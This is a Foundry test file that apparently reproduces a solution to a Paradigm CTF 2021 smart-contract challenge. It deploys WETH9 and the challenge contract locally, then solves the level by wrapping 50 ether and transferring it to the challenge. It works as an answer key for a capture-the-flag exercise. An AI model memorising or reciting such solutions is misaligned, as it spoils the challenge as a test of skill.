// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.0;

import "forge-std/Test.sol";
import "./interface.sol";

contract attackTest is Test {

    string constant Setup_Artifact = 'out/Setup.sol/Setup.json';
    string constant weth9_Artifact = 'out/helper_WETH9.sol/WETH9.json';

    ISetup level;
    IWETH9 weth9;
    
    function setUp() public payable{
        // 创建我们的WETH9合约
        weth9 = IWETH9(deployHelper_weth(weth9_Artifact));
        // 初始化题目合约，并传入WETH9合约的地址，因为复现的原因，WETH9的地址修改了一下，题目源码修改了一点，但是效果是差不多一样的
        level = ISetup(this.deployHelper_Setup{value:50 ether}(Setup_Artifact,address(weth9)));
    }

    function test_isComplete() public{
        // 因为在Paradigm 2021中，每个用户初始化拥有5000个ETH
        weth9.deposit{value: 50 ether}();
        weth9.transfer(address(level), 50 ether);

        // 检查是否完成
        assertEq(level.isSolved(), true);
    }

    function deployHelper_weth(string memory what) public returns (address addr) {
        bytes memory bytecode = vm.getCode(what);
        assembly {
            addr := create(0, add(bytecode, 0x20), mload(bytecode))
        }
    }
    function deployHelper_Setup(string memory what,address _addr) public payable returns (address addr) {
        bytes memory bytecode = vm.getCode(what);
        // 构造器有参数
        bytes memory bytecode_withConstructor = abi.encodePacked(bytecode,abi.encode(address(_addr)));
        assembly {
            addr := create(50000000000000000000, add(bytecode_withConstructor, 0x20), mload(bytecode_withConstructor))
        }
    }

}